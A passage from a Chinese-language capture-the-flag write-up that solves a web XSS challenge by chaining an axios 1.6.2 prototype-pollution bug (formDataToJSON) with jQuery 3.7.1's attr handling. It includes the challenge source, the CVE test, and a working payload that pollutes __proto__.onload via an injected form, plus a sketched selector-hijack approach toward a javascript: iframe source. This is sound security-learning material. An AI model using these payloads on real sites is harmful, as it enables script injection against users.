punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span> repo<span class="token punctuation">.</span>owner<span class="token punctuation">.</span>avatar_url<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#description"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>repo<span class="token punctuation">.</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>repo<span class="token punctuation">.</span>homepage <span class="token operator">&amp;&amp;</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"https://"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#homepage"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                    <span class="token string-property property">"src"</span><span class="token operator">:</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">,</span>                    <span class="token string-property property">"hidden"</span><span class="token operator">:</span> <span class="token boolean">false</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"search"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#search"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">search</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中這一段 <code>&lt;h2&gt;Hey &lt;%- name %&gt;</code> 是與後端唯一有關的部分，會在後端使用 DOMPurify 來進行 sanitization：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"search"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">name</span><span class="token operator">:</span> DOMPurify<span class="token punctuation">.</span><span class="token function">sanitize</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token constant">SANITIZE_DOM</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token literal-property property">search</span><span class="token operator">:</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>search    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>值得注意的是這邊的 <code>SANITIZE_DOM: false</code>，這個設置會停止對於 DOM Clobbering 的防護，因此可以猜測這題與 DOM Clobbering 有關，才會刻意把這個設置關掉。</p><p>而整題最主要的邏輯都在 search 函式裡面了：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/search"</span><span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#search"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        <span class="token string-property property">"headers"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"application/json"</span> <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">d</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> repo <span class="token operator">=</span> d<span class="token punctuation">.</span>data<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>repo<span class="token punctuation">.</span>owner<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Not found!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.avatar"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span> repo<span class="token punctuation">.</span>owner<span class="token punctuation">.</span>avatar_url<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#description"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>repo<span class="token punctuation">.</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>repo<span class="token punctuation">.</span>homepage <span class="token operator">&amp;&amp;</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"https://"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#homepage"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                <span class="token string-property property">"src"</span><span class="token operator">:</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">,</span>                <span class="token string-property property">"hidden"</span><span class="token operator">:</span> <span class="token boolean">false</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其實上面這一段，並沒有看出什麼有漏洞的地方，因此看完這段之後，我就先往用到的 library 去找，這題用到的是 jQuery 3.7.1 以及 axios 1.6.2，雖然檔案名稱沒寫，但是從檔案內容可以看得出來。</p><p>查了一下可以發現 1.6.2 並非最新版本，而且在 1.6.4 中修復了一個 prototype pollution 的漏洞：<a href="https://github.com/axios/axios/commit/3c0c11cade045c4412c242b5727308cff9897a0e">https://github.com/axios/axios/commit/3c0c11cade045c4412c242b5727308cff9897a0e</a></p><p>commit 裡面更是直接附上了 exploit，非常貼心：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">it</span><span class="token punctuation">(</span><span class="token string">'should resist prototype pollution CVE'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'foo[0]'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'foo[1]'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'__proto__.x'</span><span class="token punctuation">,</span> <span class="token string">'hack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'constructor.prototype.y'</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">expect</span><span class="token punctuation">(</span><span class="token function">formDataToJSON</span><span class="token punctuation">(</span>formData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toEqual</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      <span class="token literal-property property">foo</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token literal-property property">constructor</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">prototype</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>          <span class="token literal-property property">y</span><span class="token operator">:</span> <span class="token string">'value'</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">expect</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toEqual</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">expect</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toEqual</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>從 commit 可以看出 axios 中有一個叫做 <code>formDataToJSON</code> 的函式，會把 FormData 轉為 JSON，而轉換的程式碼中存有漏洞，可以透過 name 進行 prototype pollution。</p><p>接著再回來看題目的程式碼，有一段是：<code>axios.post(&quot;/search&quot;, $(&quot;#search&quot;).get(0)</code>，因此只要能掌握 <code>#search</code>，就能掌握這邊傳入的參數，從 axios 的原始碼中可以看出這邊傳入的 form，最後會被取出 FormData，並且傳給 <code>formDataToJSON</code>（這邊引用的部分程式碼看不出來，但只要 trace 一下之後不難發現這件事）。</p><p>因此，我們可以用 name 注入一個 <code>&lt;form&gt;</code> 來進行 prototype pollution，下一步就要尋找 gadget 了，通常在找 gadget 的時候，會先從物件下手。</p><p>而程式碼中有個部分非常可疑：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#homepage"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token string-property property">"src"</span><span class="token operator">:</span> repo<span class="token punctuation">.</span>homepage<span class="token punctuation">,</span>    <span class="token string-property property">"hidden"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>這裡傳入的參數是個物件，如果 <code>.attr</code> 函式沒有特別做檢查，很有可能會被污染的參數影響，而事實上也是這樣，在 jQuery 中，<a href="https://github.com/jquery/jquery/blob/3.7.1/src/attributes/attr.js#L16">attr 的實作如下</a>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">jQuery<span class="token punctuation">.</span>fn<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span> <span class="token punctuation">&#123;</span>    <span class="token function-variable function">attr</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span> <span class="token parameter">name<span class="token punctuation">,</span> value</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">access</span><span class="token punctuation">(</span> <span class="token keyword">this</span><span class="token punctuation">,</span> jQuery<span class="token punctuation">.</span>attr<span class="token punctuation">,</span> name<span class="token punctuation">,</span> value<span class="token punctuation">,</span> arguments<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/jquery/jquery/blob/main/src/core/access.js#L12">access 的部分實作</a>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">access</span><span class="token punctuation">(</span> <span class="token parameter">elems<span class="token punctuation">,</span> fn<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> chainable<span class="token punctuation">,</span> emptyGet<span class="token punctuation">,</span> raw</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>        len <span class="token operator">=</span> elems<span class="token punctuation">.</span>length<span class="token punctuation">,</span>        bulk <span class="token operator">=</span> key <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token comment">// Sets many values</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">toType</span><span class="token punctuation">(</span> key <span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"object"</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        chainable <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token keyword">in</span> key <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">access</span><span class="token punctuation">(</span> elems<span class="token punctuation">,</span> fn<span class="token punctuation">,</span> i<span class="token punctuation">,</span> key<span class="token punctuation">[</span> i <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> emptyGet<span class="token punctuation">,</span> raw <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果傳入的 key 是個 object，會用 in 來取出每一個 key 設定。由於 in 會取出原型鏈上的屬性，因此可以透過污染 <code>onload</code>，讓 jQuery 去設定 onload 屬性。</p><p>payload 如下：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>search</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>__proto__.onload</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>alert(document.domain)</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>q</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>react-d3</span><span class="token punctuation">></span></span>&lt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>看起來沒什麼問題，但嘗試過後，會發現出現了錯誤：</p><pre class="line-numbers language-none"><code class="language-none">Uncaught (in promise) TypeError: Cannot use &#39;in&#39; operator to search for &#39;set&#39; in alert(document.domain)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>經過一陣 debug 之後，會發現這段錯誤是源自於設置 attr 時的這一段：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Attribute hooks are determined by the lowercase version</span><span class="token comment">// Grab necessary hook if one is defined</span><span class="token keyword">if</span> <span class="token punctuation">(</span> nType <span class="token operator">!==</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token operator">!</span>jQuery<span class="token punctuation">.</span><span class="token function">isXMLDoc</span><span class="token punctuation">(</span> elem <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    hooks <span class="token operator">=</span> jQuery<span class="token punctuation">.</span>attrHooks<span class="token punctuation">[</span> name<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">]</span> <span class="token operator">||</span>        <span class="token punctuation">(</span> jQuery<span class="token punctuation">.</span>expr<span class="token punctuation">.</span>match<span class="token punctuation">.</span>bool<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span> name <span class="token punctuation">)</span> <span class="token operator">?</span> boolHook <span class="token operator">:</span> <span class="token keyword">undefined</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> value <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> value <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        jQuery<span class="token punctuation">.</span><span class="token function">removeAttr</span><span class="token punctuation">(</span> elem<span class="token punctuation">,</span> name <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> hooks <span class="token operator">&amp;&amp;</span> <span class="token string">"set"</span> <span class="token keyword">in</span> hooks <span class="token operator">&amp;&amp;</span>        <span class="token punctuation">(</span> ret <span class="token operator">=</span> hooks<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span> elem<span class="token punctuation">,</span> value<span class="token punctuation">,</span> name <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    elem<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span> name<span class="token punctuation">,</span> value <span class="token operator">+</span> <span class="token string">""</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> value<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>會先執行到 <code>hooks = jQuery.attrHooks[ name.toLowerCase() ]</code>，由於我們污染了 <code>onload</code> 屬性，所以 <code>jQuery.attrHooks[&#39;onload&#39;]</code> 會是字串，因此 hooks 也是個字串。</p><p>接著執行到 <code>&quot;set&quot; in hooks</code>，由於字串並沒有 <code>in</code> 可以用，因此拋出了先前看到的錯誤。</p><p>既然知道問題在哪了，那解決方式就簡單了，把 <code>onload</code> 改成 <code>Onload</code> 就好，因為如此一來 <code>name.toLowerCase()</code> 就會是 <code>onload</code>，而 <code>jQuery.attrHooks[&#39;onload&#39;]</code> 並不存在。</p><p>做到這裡，題目就解開了，難度比我想像中的容易很多，大約花個 3-4 個小時差不多。接著，我看到了作者的<a href="https://twitter.com/kevin_mizu/status/1744552795410456756">推特</a>，意識到原來是有 unintended，難怪難度比我想得要低。</p><h2><span id="預期解法也沒這麼難嗎">預期解法也沒這麼難…嗎？</span></h2><p>知道自己的解法是非預期之後，就開始思考起什麼才是預期解，作者有在 Discord 裡面說預期解法跟現在的非預期解法，使用到的地方完全不同，因此可以想像是把 <code>attr(&#123;&#125;)</code> 那一段排除，留下剩下的程式碼，就只剩這些：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/search"</span><span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#search"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        <span class="token string-property property">"headers"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"application/json"</span> <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">d</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> repo <span class="token operator">=</span> d<span class="token punctuation">.</span>data<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>repo<span class="token punctuation">.</span>owner<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Not found!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.avatar"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span> repo<span class="token punctuation">.</span>owner<span class="token punctuation">.</span>avatar_url<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#description"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>repo<span class="token punctuation">.</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>剩下的程式碼中，我的直覺告訴我重點是這一行：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.avatar"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span> repo<span class="token punctuation">.</span>owner<span class="token punctuation">.</span>avatar_url<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果可以利用 prototype pollution 把 <code>$(&quot;img.avatar&quot;)</code> 變成 <code>$(&#39;#homepage&#39;)</code>，選到那個 iframe 的話，再搭配上我們可以掌握 <code>repo.owner.avatar_url</code>，就能把 iframe 的 src 設置成 <code>javascript:alert(1)</code>，達成 XSS。</p><p>我覺得這個猜測非常合理，大概有九成的把握是對的，因為透過 prototype pollution 來影響 selector 這個招數應該是新的，至少我之前沒看過，而且這個很酷！也符合了作者在推特上講的：「super interesting」</p><p>因此，接下來我就花了點時間開始尋找 selector 是怎麼運作的，但這段程式碼比我想像中複雜了不少，而且牽涉到許多函式。</p><p>花了四五個小時之後，終於找到一個可以利用的地方。</p><p>首先，在執行 <code>$()</code> 的時候，底層是用 <a href="https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L197">find</a> 來找到對應的元素，而這邊會有一個 <code>documentIsHTML</code> 的檢查，如果是 true 的話，基本上就會就是利用 querySelector 之類的原生 API 去尋找，沒有操作空間。</p><p>因此我們要先想辦法讓它是 false，判斷的程式碼在<a href="https://github.com/jquery/jquery/blob/3.7.1/src/core.js#L330">這裡</a>，只要讓 <code>isXMLDoc</code> 回傳 true，<code>documentIsHTML</code> 就會是 false：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">isXMLDoc</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span> <span class="token parameter">elem</span> <span class="token 